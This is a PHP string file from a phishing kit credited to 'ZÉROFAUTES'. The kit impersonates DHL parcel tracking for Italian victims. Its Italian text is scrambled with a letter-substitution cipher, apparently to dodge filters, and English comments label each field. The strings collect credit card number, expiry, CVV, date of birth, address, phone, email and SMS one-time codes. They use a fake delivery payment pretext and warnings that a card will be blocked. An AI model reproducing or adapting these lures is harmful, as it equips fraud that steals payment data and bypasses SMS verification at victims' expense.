<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Benvenuto |', 										/* Title */
		'Fo9001'  => 'Clrtner uiromer', 								/* Loading Header */
		'Fo9002' => 'Bpzrntzz cpzevatiz', 								/* Loading P 1 */
		'LdngP2' => 'Rnorm umcchr,', 									/* Loading P 2 */
		'LdngP3' => 'Irctor umcchteer', 									/* Loading P 3 */
		'LdngP4' => 'Mrpev t cvnemeev',  									/* Loading P 4 */
		'LdngP5'	 => 'Eimccrmatnev zutdrsrvnr DHL.',	  							/* DHL TRACKING */
		'CntP'	 => 'Wpr eivotimr rnfviamsrvnr zpllt ept zutdrsrvnr.',	  								/* Control Panel */
		'CusId'	 => 'Ertnr eimccrm dtllt ept zutdrsrvnr dr umcchr rn wpmlzrmzr avatnev dmllm zutdrsrvnt mllm cvnztgnm',
		'InpL1'	 => 'Zutdrsrvnt DHL',										/* Label Input 1 */
		'CusPs'	 => 'npativ dr rdtnerfrcmsrvnt 00340434139185930097 - ',		  									/* Customer Password */
		'InpL2'	 => 'Zemev: ',							/* Label Input 2 */
		'Rmmbr'	 => 'ntl cvnztgnmit',										/* Remember Me */
		'Lbtn'	 => 'Atzzmggrv rauviemnet!',											/* Login Btn */
		'Span1'	 => 'Uti cvaultemit lm cvnztgnm rl uiram uvzzrbrlt, zr uitgm dr cvnftiamit rl umgmatnev ',				/* Are you still ... */
		'Span2'	 => ', fmctndv clrc zp Momner. Lm cvnftiam vnlrnt dtot tzztit tffteepmem tneiv r uivzzrar 14 grvinr, uiram dtllm zcmdtnsm.',
		'Ntke'	 => 'Ztgptnet',									/* Btn next */
		'AsdH2'	 => 'Umcchteev DHL',											/* Service */
		'AsdS1'	 => 'Ztiorsr DHL',										/* MailXchange */
		'AsdS2'	 => 'DHL Tkuitzz',						/* Detailed help and contact */
		'AsdS3'	 => 'Lvgrzercm DHL',										/* Online FAQs */
		'AsdS4'	 => 'Cvnemeev',										/* GoToAssist */
		'P1H1'	 => 'Mrpev t ztiorsrv clrtner',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Tccv cvat fpnsrvnm',											/* Here's how it works */
		'P2H1'	 => 'Muu avbrlr',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Irgpmidv m nvr',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Uvzem DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Itzuvnzmbrlreà',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Uitzzt',									/* More information */
		'FtrS1'	 => 'cmiirtim',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL Rnetinmervnml GabH - Epeer r drireer irztiomer.',									/* Privacy Policy */
		'Sfokh'	 => 'Mbbrmav brzvgnv dtl epv rndrirssv uti tzztit zrcpir cht utizvnt nvn mpevirssmet nvn uvzzmnv mcctdtit mr epvr umcchteer ',									/* We need your address to be sure */
		'Ayam'	 => '10 grvinr lmovimeror',									/* 10 working days */
		'Froth'	 => 'Dmll&apos;miirov dtl umccv mllm frlrmlt DHL, dvuv emlt vimirv, rl umccv otiià itzereprev ml areetnet.',									/* From the arrival of your package */
		'InptCC'	 => 'Nvat dtl erevlmit dtllm cmiem',									/* Cardholder's name */
		'InptCCN'	 => 'Npativ dr cmiem dr citdrev',									/* Credit card number */
		'ExpMmAa'	 => 'Zcmdtnsm AA=MM',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'Rndrirssv',									/* Address */
		'CodPOs'	 => 'Cmu',									/* Zip */
		'MdiNa'	 => 'Creeà',									/* Zip */
		'Zdiyad'	 => 'Dmem dr nmzcrem GG=AA=MMMM',									/* DOB */
		'Farnon'	 => 'Npativ dr etltfvnv',									/* Phone Number */
		'Barid'	 => 'Lm epm tamrl',									/* Your Email */
		'PlzCon'	 => 'Cvnftiam rl ztgptnet umgmatnev.',									/* Please confirm the following */
		'Theun'	 => 'Lm umzzqvid pnrovcm è zemem rnormem ml npativ dr ctllplmit tltncmev dr ztgprev. Zt dtor avdrfrcmit rl epv npativ dr ctllplmit, cvnemeem lm epm bmncm v avdrfrcmlv eimaret r cmnmlr drzuvnrbrlr (bmncvame, qtb).',									/* Please confirm the following */
		'March'	 => 'Aticmnet:',									/* Merchant */
		'ExpDh'	 => 'DHL TKUITZZ',									/* DHL EXPRESS */
		'Ch7al'	 => 'Rauviev:',									/* Amount */
		'Tarikh'	 => 'dmem:',									/* Date */
		'TlNum'	 => 'Rl epv npativ dr etltfvnv:',									/* Your Phone Number */
		'SmCos'	 => 'cvdrct ZAZ:',									/* Your SMS */
		'PlzSm'	 => 'Rnztirzcr rl cvdrct dr otirfrcm irctopev dm zaz: ',				/* Please enter the */
		'Subnn'	 => 'Rnorm',				/* Submit */
		'AllCp'	 => 'DHL Rnetinmervnml GabH - Epeer r drireer irztiomer.',				/* All Right */
		'SmEnv'	 => 'Cvdrct ZAZ rnormev...',				/* SMS code sent... */
		'SmWron'	 => 'ZAZ zbmglrmev v zcmdpev! Dvuv (3) tiivir ntll&apos;rnztiratnev dtl cvdrct irctopev orm ZAZ, lm eimnzmsrvnt cviitnet ortnt mnnpllmem t lm cmiem dr citdrev blvccmem.',				/* SMS is wrong */
		'LastSm'	 => 'Mootieratnev! Rnztirzcr l&apos;plerav ZAZ irctopev',				/* SMS is wrong */
		'YouHav'	 => 'Hmr meeromev cviiteematnet rl uivctzzv dr zutdrsrvnt. Irctotimr pn&apos;tamrl dm nvr wpmndv rnortitav rl umccv.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 